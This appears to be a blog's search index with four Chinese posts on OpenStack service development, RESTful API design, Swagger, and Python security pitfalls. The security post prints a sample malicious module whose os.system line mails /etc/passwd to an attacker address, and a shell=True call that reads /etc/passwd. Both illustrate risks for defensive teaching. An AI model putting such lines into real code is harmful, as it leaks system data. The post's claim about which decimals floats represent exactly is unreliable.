<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[如何开发Openstack服务-开篇(一)]]></title>
      <url>%2F2017%2F01%2F10%2Fdevelop-openstack-service%2F</url>
      <content type="text"><![CDATA[openstack是我见过最大最复杂的python项目, 虽然openstack项目的热度在下滑, 但是openstack这套开发理念任然是相当不错的，值得我们学习. 由于工作需要, 我也需要开发一些自定义的openstack服务, 因此想将开发openstack服务的过程以一系列的文章记录下来, 方便需要的人。 openstack简介openstack是一个IaaS平台, 提供计算服务、网络服务、存储服务等, 有3种方式使用openstack提供的服务 API通过API使用OpenStack的方式是由各个服务自己实现的, 这些API都是有统一的形式的，都是采用了HTTP协议实现的符合REST规范的API。 CLI/SDK通过命令行是用OpenStack服务的方式是由一系列项目来提供的，这些项目一般都命名为python-projectclient，比如python-keystoneclient，python-novaclietn等。这些命令行项目分别对应到各个主要的服务，为用户提供命令行操作界面和Python的SDK。比如python-keystoneclient对应到keystone，为用户提供了keystone这个命令，同时也提供了keyston项目的SDK（其实是在SDK的基础上实现了命令行）。这些client项目提供的SDK其实也是封装了对各自服务的API的调用。由于每个主要项目都有一个自己的命令行工具，社区觉得不好，于是又有了一个新的项目python-openstackclient，用来提供一个统一的命令行工具openstack（命令的名字就叫做openstack），这个工具实现了命令行，然后使用各个服务的client项目提供的SDK来完成对应的操作 WebUI通过Web界面使用OpenStack服务这种方式是通过OpenStack的Horizon项目提供的。Horizon项目是一个Django应用，实现了一个面板功能，是传统的MVC开发模型, 不过最新的项目 在慢慢往Angular上迁移。Horizon项目主要是提供一种交互界面，它会通过API来和各个OpenStack服务进行交互，然后在Web界面上展示各个服务的状态；它也会接收用户的操作，然后调用各个服务的API来完成用户对各个服务的使用 因此开发一个完整的openstack项目需要完成上面介绍的3部分的开发，当然API服务是根本。 openstack架构整个openstack的服务是以插件化得方式进行独立开发, 然后通过API相互关联, 比如:接下来我们会以demo的形式开发一个和openstack服务类似的服务，该服务的名称就叫demo openstack中的api服务openstack的API设计风格为RESTful, 如何设计RESTful API我在前面的博客中有介绍, Python的Web开发框架很多，基本上，还活跃的框架都支持RESTful API的开发, 有些框架还专门为RESTful API的开发提供了便利的功能,比如Pecan，有些框架则通过第三方模块来提供这种便利，比如Django和Flask都有不少和REST相关的第三方库。对于框架选择，也没有什么特别好的标准，一般都是比较性能、文档、社区是否活跃等。在我看来，选择流行的一般就不会错下面是openstack keystone关于credential的API: 早期项目的api服务OpenStack项目倾向于不重新发明轮子，一般都会选择现有的库和框架来使用，除非现有的框架不满足需求。因为Web框架的选择很多，而且都满足需求，所以OpenStack项目到目前为止都是使用现成的Web框架。OpenStack早期的项目并没有使用一个框架，而是使用了几个不同的模块来组合出一个框架：Paste + PasteDeploy + Routes + WebOb，这几个不同的模块分别负责应用的WSGI化、URL路由和请求处理等功能。Nova, Glance, Neutron, Keystone等早期的项目都是使用这样的架构来实现RESTful API的。早期的这种技术选型带来的好处是”框架”具备足够的灵活性，缺点则是要把这几个模块组合起来实现一个REST服务，需要写很多代码，连WSGI的入口函数都要自己实现（比如Keystone项目的keystone/common/wsgi.py文件中的class Application）。因为灵活性的好处不是很明显，而代码量大的坏处很明显，比如上面那个class Application需要在每个项目中复制一遍，所以社区的新项目就开始使用新的Web框架Pecan 新项目的api服务Pecan是一个基于对象路由的框架，即灵活又简单。Pecan主要实现了URL路由功能，支持RESTful API。Pecan没有实现模板、session管理和ORM等功能，但是这些功能可以通过其他的模块来实现。对于OpenStack来说，Pecan是一个很好的选择，因为OpenStack项目中统一使用sqlalchemy来实现ORM，API的实现也不需要模板功能，安全控制则基于Keystone体系。使用Pecan来开发REST服务，代码量很少，代码结构也清晰。Ceilometer项目就是使用了Pecan]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[RESTful API 设计规范]]></title>
      <url>%2F2017%2F01%2F06%2Frest-api-design%2F</url>
      <content type="text"><![CDATA[做出一个好的API设计很难。API表达的是你的数据和你的数据使用者之间的契约，因此API的设计往往是站在使用者的角度进行的，而关于RESTful的介绍可以参考阮一峰的博客理解RESTful架构 , 这里同时也参考了他的另一篇博客RESTful API 设计指南在这方面有一篇很出名的文章，这里需要你自己解决翻墙问题Principles of good RESTful API Design 定义 这里有一些非常重要的术语，我将在本文里面一直用到它们 资源(Resource)：一个对象的单独实例，如一只动物 集合(Collection)：一群同种对象，如动物 HTTP：跨网络的通信协议 客户端(Consumer)：可以创建HTTP请求的客户端应用程序 第三方开发者(Third Party Developer)：这个开发者不属于你的项目但是有想使用你的数据 服务器(Server)：一个HTTP服务器或者应用程序，客户端可以跨网络访问它 端点(Endpoint)：这个API在服务器上的URL用于表达一个资源或者一个集合 幂等(Idempotent)：无边际效应，多次操作得到相同的结果 URL段(Segment)：在URL里面已斜杠分隔的内容 数据设计与抽象 理清业务数据流程 规划好你的API的外观要先于开发它实际的功能。首先你要知道数据该如何设计和核心服务/应用程序会如何工作, 这部分的工作 往往就是需要写好 PRD和DRD这些功能文档 站在使用者的角度进行合理抽象 有时候一个集合可以表达一个数据库表，而一个资源可以表达成里面的一行记录，但是这并不是常态。事实上，你的API应该尽可能 通过抽象来分离数据与业务逻辑。这点非常重要，只有这样做你才不会打击到那些拥有复杂业务的第三方开发者， 否则他们是不会使用你的API的。 如何开放API 当然你的服务可能很多部分是不应该通过API暴露出去的。比较常见的例子就是很多API是不允许第三方来创建用户的。 HTTP 动词一个好的RESTful API只允许第三方调用者使用这四个半HTTP动词进行数据交互，并且在URL段里面不出现任何其他的动词。一般来说，GET请求可以被浏览器缓存（通常也是这样的）。例如，缓存请求头用于第二次用户的POST请求。HEAD请求是基于一个无响应体的GET请求，并且也可以被缓存的。 GET (选择)：从服务器上获取一个具体的资源或者一个资源列表。 POST （创建）： 在服务器上创建一个新的资源。 PUT （更新）：以整体的方式更新服务器上的一个资源。 PATCH （更新）：只更新服务器上一个资源的一个属性。 DELETE （删除）：删除服务器上的一个资源。 HEAD ： 获取一个资源的元数据，如数据的哈希值或最后的更新时间。 OPTIONS：获取客户端能对资源做什么操作的信息。 域名 域名是用于访问你的API服务的第一步，因此如何在域名上表现自己提供的API 服务喃，以下有2种方法 应该尽量将API部署在专用域名之下。 如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。 12https://api.example.com # 专业域名https://example.org/api/ # URI中明确说明 版本化 API是服务器与客户端之间的一个公共契约。如果你对服务器上的API做了一个更改，并且这些更改无法向后兼容， 那么你就打破了这个契约，客户端又会要求你重新支持它。为了避免这样的事情，你既要确保应用程序逐步的演变， 又要让客户端满意。那么你必须在引入新版本API的同时保持旧版本API仍然可用。 随着时间的推移，你可能声明不再支持某些旧版本的API。申明不支持一个特性并不意味着关闭或者破坏它。 而是告诉客户端旧版本的API将在某个特定的时间被删除，并且建议他们使用新版本的API。 如果你只是简单的增加一个新的特性到API上，如资源上的一个新属性或者增加一个新的端点，你不需要增加API的版本。 因为这些并不会造成向后兼容性的问题，你只需要修改文档即可。 这里实现方式有2种： 应该将API的版本号放入URL 将版本号放在HTTP头信息中，但不如放入URL方便和直观, Github采用的就是这种做法 1234567891011121314151617181920https://api.example.com/v1/ # 在URL中说明curl -i https://api.github.com/users/octocat/orgs # HTTP头中表示API版本 HTTP/1.1 200 OK Server: nginx Date: Fri, 12 Oct 2012 23:33:14 GMT Content-Type: application/json; charset=utf-8 Connection: keep-alive Status: 200 OK ETag: &quot;a00049ba79152d03380c34652f2cb612&quot; X-GitHub-Media-Type: github.v3 X-RateLimit-Limit: 5000 X-RateLimit-Remaining: 4987 X-RateLimit-Reset: 1350085394 Content-Length: 5 Cache-Control: max-age=0, private, must-revalidate X-Content-Type-Options: nosniff API ROOT URI API的根地址很重要。可以通过这个列表快速了解你提供的服务，因此，让你的API根入口点保持尽可能的简单。以github的列 123456789101112131415161718192021222324252627282930313233maojun@maojun-mbp# curl https://api.github.com&#123; &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;, &quot;current_user_authorizations_html_url&quot;: &quot;https://github.com/settings/connections/applications&#123;/client_id&#125;&quot;, &quot;authorizations_url&quot;: &quot;https://api.github.com/authorizations&quot;, &quot;code_search_url&quot;: &quot;https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;emails_url&quot;: &quot;https://api.github.com/user/emails&quot;, &quot;emojis_url&quot;: &quot;https://api.github.com/emojis&quot;, &quot;events_url&quot;: &quot;https://api.github.com/events&quot;, &quot;feeds_url&quot;: &quot;https://api.github.com/feeds&quot;, &quot;followers_url&quot;: &quot;https://api.github.com/user/followers&quot;, &quot;following_url&quot;: &quot;https://api.github.com/user/following&#123;/target&#125;&quot;, &quot;gists_url&quot;: &quot;https://api.github.com/gists&#123;/gist_id&#125;&quot;, &quot;hub_url&quot;: &quot;https://api.github.com/hub&quot;, &quot;issue_search_url&quot;: &quot;https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;issues_url&quot;: &quot;https://api.github.com/issues&quot;, &quot;keys_url&quot;: &quot;https://api.github.com/user/keys&quot;, &quot;notifications_url&quot;: &quot;https://api.github.com/notifications&quot;, &quot;organization_repositories_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;organization_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;&quot;, &quot;public_gists_url&quot;: &quot;https://api.github.com/gists/public&quot;, &quot;rate_limit_url&quot;: &quot;https://api.github.com/rate_limit&quot;, &quot;repository_url&quot;: &quot;https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;&quot;, &quot;repository_search_url&quot;: &quot;https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;current_user_repositories_url&quot;: &quot;https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;starred_url&quot;: &quot;https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;&quot;, &quot;starred_gists_url&quot;: &quot;https://api.github.com/gists/starred&quot;, &quot;team_url&quot;: &quot;https://api.github.com/teams&quot;, &quot;user_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;&quot;, &quot;user_organizations_url&quot;: &quot;https://api.github.com/user/orgs&quot;, &quot;user_repositories_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;user_search_url&quot;: &quot;https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;&#125; Endpoints 一个端点就是指向特定资源或资源集合的URL。针对每一个端点来说，你可能想列出所有可行的HTTP动词和端点的组合。 在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词， 而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的 “集合”（collection），所以API中的名词也应该使用复数。 请注意如何展示数据之间的关系，特别是雇员与动物园之间的多对多关系。通过添加一个额外的URL段就可以实现更多的交互能力。 当然没有一个HTTP动词能表示正在解雇一个人，但是你可以使用DELETE一个动物园里的雇员来达到相同的效果。 1234567891011121314151617https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/animal_typeshttps://api.example.com/v1/employeesGET /zoos: List all Zoos (ID and Name, not too much detail)POST /zoos: Create a new ZooGET /zoos/ZID: Retrieve an entire Zoo objectPUT /zoos/ZID: Update a Zoo (entire object)PATCH /zoos/ZID: Update a Zoo (partial object)DELETE /zoos/ZID: Delete a ZooGET /zoos/ZID/animals: Retrieve a listing of Animals (ID and Name).GET /animals: List all Animals (ID and Name).POST /animals: Create a new AnimalGET /animals/AID: Retrieve an Animal objectPUT /animals/AID: Update an Animal (entire object)PATCH /animals/AID: Update an Animal (partial object) 过滤和排序 使用过滤和排序有多种原因，因此API应该提供参数，过滤和排序返回结果，降低客户端的复杂度。 如果记录数量很多，服务器不可能都将它们返回给用户。 从客户端的角度来说，最小化网络传输，并让客户端尽可能快的得到查询结果。 从服务器角度来说，响应请求越小负载就越小。 1234?limit=10: 减少返回给客户端的结果数量（用于分页）?offset=10: 发送一堆信息给客户端（用于分页）?animal_type_id=1: 使用条件匹配来过滤记录?sortby=name&amp;order=asc: 对结果按特定属性进行排序 状态码 服务器向用户返回的状态码和提示信息，因为它们是HTTP的标准，所以通用性上有保证， 状态码的完整定义请看HTTP1.1/rfc Status Code define 1234567891011121314151617181920状态码范围说明：1xx：保留给底层HTTP功能使用的，并且估计在你的职业生涯里面也用不着手动发送这样一个状态码出来。2xx：保留给成功消息使用的，你尽可能的确保服务器总发送这些状态码给用户。3xx：保留给重定向用的。大多数的API不会太常使用这类状态码，但是在新的超媒体样式的API中会使用更多一些。4xx：保留给客户端错误用的。例如，客户端提供了一些错误的数据或请求了不存在的内容。这些请求应该是幂等的，不会改变任何服务器的状态。5xx：保留给服务器端错误用的。这些错误常常是从底层的函数抛出来的，并且开发人员也通常没法处理。发送这类状态码的目的是确保客户端能得到一些响应。收到5xx响应后，客户端没办法知道服务器端的状态，所以这类状态码是要尽可能的避免。常见的一些状态码：200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）204 NO CONTENT - [DELETE]：用户删除数据成功。400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。 错误处理如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。 123&#123; error: "Invalid API key"&#125; 返回结果 针对不同操作，服务器向用户返回的结果应该符合以下规范。 123456GET /collection: 返回一系列资源对象GET /collection/resource: 返回单独的资源对象POST /collection: 返回新创建的资源对象PUT /collection/resource: 返回完整的资源对象PATCH /collection/resource: 返回完整的资源对象DELETE /collection/resource: 返回一个空文档 Hypermedia API RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么 Hypermedia API的设计被称为HATEOAS link: 用户读取这个属性就知道下一步该调用什么API了 rel: rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址） href: API的绝对路径 title: API的标题,用于概述用途 type: API 响应的数据类型 123456&#123;&quot;link&quot;: &#123; &quot;rel&quot;: &quot;collection https://www.example.com/zoos&quot;, &quot;href&quot;: &quot;https://api.example.com/zoos&quot;, &quot;title&quot;: &quot;List of zoos&quot;, &quot;type&quot;: &quot;application/vnd.yourformat+json&quot;&#125;&#125; 12345 maojun@maojun-mbp#curl https://api.github.com/user&#123; &quot;message&quot;: &quot;Requires authentication&quot;, &quot;documentation_url&quot;: &quot;https://developer.github.com/v3&quot;&#125; 认证 认证和授权的用户模型该尽量采用RBAC模型，因为其良好的扩容性。 API认证的手段最好采用OAuth2.0, 简单的可以采用 JWT（Json Web Token） 关于OAuth的简介可以参考阮一峰OAuth2.0简介 关于JWT参考此文JWT使用 内容类型 XML已是过去时了，现代的web统一使用JSON，也就是HTTP头种的Content Type标签采用 application/json 1234567891011121314151617181920212223242526请求报文POST /v1/animal HTTP/1.1Host: api.example.orgAccept: application/jsonContent-Type: application/jsonContent-Length: 24 &#123; &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;响应报文HTTP/1.1 200 OKDate: Wed, 18 Dec 2013 06:08:22 GMTContent-Type: application/jsonAccess-Control-Max-Age: 1728000Cache-Control: no-cache &#123; &quot;id&quot;: 12, &quot;created&quot;: 1386363036, &quot;modified&quot;: 1386363036, &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[如何使用swagger设计出漂亮的RESTful API]]></title>
      <url>%2F2017%2F01%2F05%2Fapi-design-swagger%2F</url>
      <content type="text"><![CDATA[按照现在的趋势，前后端分离几乎已经是业界对开发和部署方式所达成的一种共识, 后台只负责数据的提供和计算，而完全不处理展现。而前端则负责拿到数据，组织数据并展现的工作。这样结构清晰，关注点分离，前后端会变得相对独立并松耦合。而前段和后端对待的契约就是API设计文档, 有了API的设计文档过后, 后端依据设计文件开发后端程序, 前段根据API设计文档模拟服务器,开发前段页面。而Swagger就是其中一种比较优秀的 RESTful API设计工具。 swagger 工具简介swagger是一个RESTful API 的设计工具，官方提供3种工具： swagger-editor 在线编辑器，同时提供编辑-展现-客户端-服务端代码的生成 swagger-ui 展示工具，将编辑器定义好的json描述文件友好展示的工具。 swagger-codegen 生成服务端和客户端的代码。 因为swagger-editor集成了swagger-codegen功能，因此我们仅需要使用swagger-editor和swagger-ui就够了。 编辑器(editor)可以使用在线编辑器，而由于网络原因, 往往不能很好的使用swagger提供的在线编辑器，然而这个在线编辑器也可以本地部署，其次有很多编辑器也有swagger的插件, 通过按照swagger插件，我们也可以配置出一个swagger的编辑器。有了编辑器后，我们需要熟悉使用swagger来设计API的一些语法。 部署本地编辑器安装docker，配置镜像加速，然后拉去镜像到本地运行12docker pull swaggerapi/swagger-editordocker run -p 80:8080 swaggerapi/swagger-editor 使用本地编辑器推荐使用vscode作为编辑器, 安装vscode的Swagger View插件 就可以打造一个 swagger的编辑器了采用yaml编写，然后使用Swagger Preview 查看预览。 swagger2.0语法详情参考swagger2.0官方规范 格式采用json， 因为yaml是json的一个超集，因此也可以使用。通常情况我们通过yaml来完成编辑，最后通过编辑器导出为json文件。 文件结构为一个单独的文件，但是其中definitions部分可以被抽出来为一个独立文件，通过$ref进行引用，按照惯例，这个文件应该被命名为 swagger.json 数据类型用于描述一个数据的数据类型，对象定义时使用。 Common Name type format Comments integer integer int32 signed 32 bits long integer int64 signed 64 bits float number float double number double string string byte string byte base64 encoded characters binary string binary any sequence of octets boolean boolean date string date As defined by full-date - RFC3339 dateTime string date-time As defined by date-time - RFC3339 password string password Used to hint UIs the input needs to be obscured. 规范规范也就是语法，会安装此规范来编写API设计文档。以下列出了所有需要的关键字段 字段名 类型 描述 swagger string 必填项。表示使用的swagger的版本，必须为2.0 info Info Object 必填项。提供API的一些元数据描述 host string 提供该API服务的主机名称或者IP，测试时 使用该地址进程测试。 basePath string API的基本路径,这是相对的host。 如果不包括,API是直属host。 必须以”/“开头 schemes [string] API的传输协议的列表。 在”http”,”https”,”ws”,”wss”其中选择 consumes [string] 一个MIME类型的api可以使用列表。 值必须是所描述的Mime类型 produces [string] MIME类型的api可以产生的列表。 值必须是所描述的Mime类型 paths 路径对象 必填项。可用的路径和操作的API definitions 定义对象 一个对象数据类型定义 parameters 参数定义对象 定义请求参数的对象 responses 反应定义对象 定义请求响应对象 securityDefinitions 安全定义对象 安全方案定义规范,比如认证 security 安全需求对象 这里主要指使用哪种认证手段 tags 标签对象 没个RESTful中资源的标签，列表中的每个标记名称必须是唯一的 externalDocs 外部文档对象 额外的外部文档, 指向外部url 渲染器(ui)swagger-ui的使用很简单swager-ui官方文档 HTML文档渲染渲染器使用官方的swagger-ui，这里我们需要一个web服务器，用来渲染我们刚才编辑完成的api 设计文档。这里一般使用node 的 express为web框架来做这个简单的web服务器 PDF文档渲染将API设计文档渲染成PDF, 流程是这样: swagger.yaml —&gt; asciiDoc—&gt; pdf 使用swagger2markup来生成asciiDoc格式的文档下载swagger2markup工具,下载地址,选择你想要的版本下载使用工具生成asciiDoc, -i指定swagger.yaml的位置, -f指定输出文件名称： 1java -jar swagger2markup-cli-1.1.0.jar convert -i ~/PycharmProjects/doc/api_design/swagger.yaml -f asiidoc/swagger 使用asciidoctor来将asciiDoc换换成PDF这是一个ruby写的工具，我本地不打算部署ruby环境，因此在找一个docker镜像：madduci/docker-asciidoctor-pdf由于访问dockerhub的镜像速度非常慢，因此我将该工具的使用说明复制了下来，镜像使用说明 Docker Image exposing asciidoctor-pdf as entrypoint and /document as mounted volume where to build the fileTo build your own documents as PDF, simply run the container as:docker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf /document/your_document.adocIf you want to use some custom styles, just run it asdocker run –rm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf -a pdf-stylesdir=/document/resources/themes -a pdf-style=your_style -a pdf-fontsdir=/document/resources/fonts /document/your_document.adocand it will generate the pdf in the mounted volume /document 这工具在生成含有中文的pdf文档时有字体问题，因此我修改了字体为微软雅黑字体，以下是修改方法： 添加雅黑字体到当前的Fonts文件夹下面,这里需要标准字体和粗体, 而默认提供的字体只有这些默认提供的字体 1234➜ asiidoc ls Fonts |grep -i &apos;yahei&apos;Microsoft Yahei.ttfyahei.ttfyahei_bold.ttf 修改主题配置default-theme.yml的Noto Serif字段，使用该字体:配置文件下载地址默认配置文件下载地址 12345Noto Serif:normal: yahei.ttfbold: yahei_bold.ttfitalic: yahei.ttfbold_italic: yahei_bold.tt 最后把我们生成好的swagger.adoc, 主题配置文件,字体 放在一个目录下，挂载到docker里面去: 123➜ Downloads ls asiidocFonts swagger.adoc themesdocker run --rm -v $(pwd)/asiidoc/:/document/ madduci/docker-asciidoctor-pdf -a pdf-fontsdir=/document/Fonts -a pdf-stylesdir=/document/themes /document/swagger.adoc 最后查看asiidoc下面就会有生成的pdf文件 代码生成器(codegen)swagger能提供服务端和客户端的代码生成功能,这个功能在swagger-editor上已经集成生成server端代码：生成客户端代码：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用Python中的一些安全建议]]></title>
      <url>%2F2017%2F01%2F02%2Fpython-bestpractice%2F</url>
      <content type="text"><![CDATA[由于Python简洁，优雅，开发效率高，渐渐在计算环境中无处不在。但是如果你不注意，容易编写出具有严重安全隐患的代码, 以下我整理的一些如何编写出安全代码的一些建议。 input函数在Python 2大量的内置功能集合中，input完全就是一个安全灾难。一旦调用它，从标准输入读入的任何东西都会被立即解析为Python代码：12345678910➜ ~ python2Python 2.7.12 (default, Dec 2 2016, 21:51:52)[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwinType "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; input()dir()['__builtins__', '__doc__', '__name__', '__package__']&gt;&gt;&gt; input()__import__('sys').exit()➜ ~ 显然，必须永远不使用input函数，除非脚本的标准输入中的数据是完全可信的。 Python 2文档建议将raw_input作为一个安全的替代品。在Python 3中，input函数等同于raw_input，从而一劳永逸地解决了这个隐患 assert语句在 Python 应用中使用 assert 语句在不可能条件下捕获是一个编程习惯。123def verify_credentials(username, password): assert username and password, 'Credentials not supplied by caller' ... authenticate possibly null user with null password ... 然而，在将源代码编译成优化的字节码时（例如， python - O ），Python 并不为 assert 语句生成任何指令。它默默地删除那些程序员写的让程序免受畸形数据攻击的代码，让应用暴露在攻击之中。该漏洞的根本原因在于 assert机制纯粹是为测试目的而设，正如在 C++ 中做的那样。程序员必须使用其他手段以保证数据一致性。 不要使用is来比较int在我们的印象里，int是不可变对象，我们来看看下面这个例子12345678910&gt;&gt;&gt; a = 257&gt;&gt;&gt; b = 257&gt;&gt;&gt; a is bFalse&gt;&gt;&gt; a == bTrue&gt;&gt;&gt; a = 256&gt;&gt;&gt; b = 256&gt;&gt;&gt; a is bTrue 为了避免每次给经常使用到这部分整数分配一个新的内存，Python预先生成并缓存好这些常用整数([-5, 257))，这样的预处理可以加快程序运行时效率，更详细的了解会在以后的Python数据结构源码解读部分做介绍。因此不要使用is比较整数大小，is是用于比较是否为同一对象的，is本身是不是用来干这件事的。 float的舍入问题因为十进制的小数并不能用二进制精确的表达出来, 在十进制中，进制的基数是10，而5正好是10的一半。 2的一半是多少？当然是1了。 所以，十进制的0.5就是二进制的0.1, 而对于二进制来说，只有0和1的变化，那么只有0.1和0.0,这样仅能精确表达十进制0.0和0.5,你以此类推，那么会发现一个结论：如果一个十进制数可以用二进制精确表示，那么它的最后一位肯定是5,所以只有以5结尾的小数才能被精确的计算我们看看下面一个有趣的现象。1234567891011121314151617181920212223242526In [1]: 0.1 + 0.1Out[1]: 0.2In [2]: 0.1 + 0.1 + 0.1Out[2]: 0.30000000000000004In [3]: 0.1 + 0.1 + 0.1 + 0.1Out[3]: 0.4In [4]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[4]: 0.5In [5]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[5]: 0.6In [6]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[6]: 0.7In [7]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[7]: 0.7999999999999999In [8]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[8]: 0.8999999999999999In [9]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[9]: 0.9999999999999999 我看到有位网友的提出的解决方案： 我有一个观点，针对小数精度不够的问题（例如 0.1），软件可以人为的在数据最后一位补 5， 也就是 0.15，这样牺牲一位，但是可以保证数据精度，还原再把那个尾巴 5 去掉。1234567891011In [40]: 0.4 + 0.2Out[40]: 0.6000000000000001In [41]: (0.45 + 0.25) - (0.05 + 0.05)Out[41]: 0.In [49]: 0.6 + 0.3Out[49]: 0.8999999999999999In [50]: 0.65 + 0.35 - (0.05 + 0.05)Out[50]: 0.9 最好的处理措施是只要有可能，就坚持整数运算。次好的处理措施可能是使用decimal模块，它试图保护用户免受琐碎细节和危险缺陷之苦。 私有属性Python 不支持对象属性隐藏, 及时你使用__来保护你的变量(private),在内部，python也仅仅是将其别名了而已，而这个别名的动作是在解释器调用type来创建class时执行的的。123456789101112131415161718192021222324252627In [54]: class X(object): ...: def __init__(self): ...: self.__private = 1 ...: def get_private(self): ...: return self.__private ...: def has_private(self): ...: return hasattr(self, '__private') ...:In [55]: x = X()In [56]: x.has_private()Out[56]: FalseIn [57]: x.get_private()Out[57]: 1In [58]: x.__private = 2In [59]: x.__privateOut[59]: 2In [60]: hasattr(x, '__private')Out[60]: TrueIn [61]: x._X__privateOut[61]: 1 然后如果我们后面动态添加的属性，那么是不会有这种保护的(无转换发生)12345In [62]: x.__privateOut[62]: 2In [63]: hasattr(x, '__private')Out[63]: True 如果程序员依赖于双下划线属性来在他们的代码中做出重要决定，而不关注私有属性的不对称行为，那么这些小技巧会变成安全漏洞 模块执行语句实际上会导致导入的模块中的代码的执行，这一事实并不明显。这就是为什么甚至导入不可信模块或包是有风险的。导入像这样的简单模块可能会导致不愉快的结果：1234567891011$ cat malicious.pyimport osimport sysos.system('cat /etc/passwd | mail attacker@blackhat.com')del sys.modules['malicious'] # pretend it's not imported$ python&gt;&gt;&gt; import malicious&gt;&gt;&gt; dir(malicious)Traceback(most recent call last):NameError: name 'malicious' is not defined 猴子补丁运行时修改 Python 对象属性的过程称之为猴子补丁 ( monkey patching)。作为动态语言， Python 完全支持运行时程序自省和代码突变。一旦以某种方式导入了一个恶意模块，那么任何现有的可变对象可被不知不觉地在没有程序员同意的情况下被打猴子补丁。攻击者可以利用 Python 垃圾回收器 ( gc.get_objects())来掌握现有的所有对象，并黑进它们中任意一个。 Python 对象的类型是由 __class__ 属性决定的。邪恶的攻击者可以通过依靠改变活动对象的类型来令人绝望地把事情搞砸：12345678910111213141516171819&gt;&gt;&gt; class X(object): pass...&gt;&gt;&gt; class Y(object): pass...&gt;&gt;&gt; x_obj = X()&gt;&gt;&gt; x_obj&lt;__main__.X object at 0x7f62dbe5e010 &gt;&gt;&gt;&gt; isinstance(x_obj, X)True&gt;&gt;&gt; x_obj.__class__ = Y&gt;&gt;&gt; x_obj&lt;__main__.Y object at 0x7f62dbe5d350 &gt;&gt;&gt;&gt; isinstance(x_obj, X)False&gt;&gt;&gt; isinstance(x_obj, Y)True&gt;&gt;&gt; 对抗恶意猴子补丁的唯一处理措施是保证导入的 Python 模块的真实性和完整性, 一个简单的方法是使用__slot__来保护自己的类不被注入攻击,但是这又丧失了一些灵活性。 通过subprocess进行shell注入以胶水语言著称，对Python脚本来说，通过让操作系统来执行它们，可能还提供额外的参数，来委派系统管理任务给其他程序，是非常常见的。subprocess模块为这样的任务提供了易于使用和相当高层次的服务。12345&gt;&gt;&gt; from subprocess import call&gt;&gt;&gt; call('date')2017年 1月10日 星期二 13时11分53秒 CST0&gt;&gt;&gt; 但有一个陷阱！要利用UNIX shell服务，例如命令行参数扩展，call函数的shell关键字参数应该设置为True。然后原样传递call函数的第一个参数给系统shell，用以进一步的解析。一旦无效的用户输入到达call函数(或者其他在 subprocess 模块中实现的函数)，那么就会开放一个口给底层系统资源。12345&gt;&gt;&gt; call('cut -d: -f1 /etc/passwd', shell=True)nobodyrootdaemon... 显然，将shell关键字保持默认值False，并且提供命令及其参数的数组给subprocess函数，不要为外部命令执行调用UNIX shell，这样会安全得多。在这第二次调用格式，命令或者它的参数都不会被shell解析或展开。如果应用的本质决定了使用UNIX shell服务，那么清理一切到 subprocess的参数，确保没有不想要的shell功能可以被恶意用户利用，这完全是重要的。在更新的Python版本中，可以用标准库的shlex.quote函数来进行shell转义。 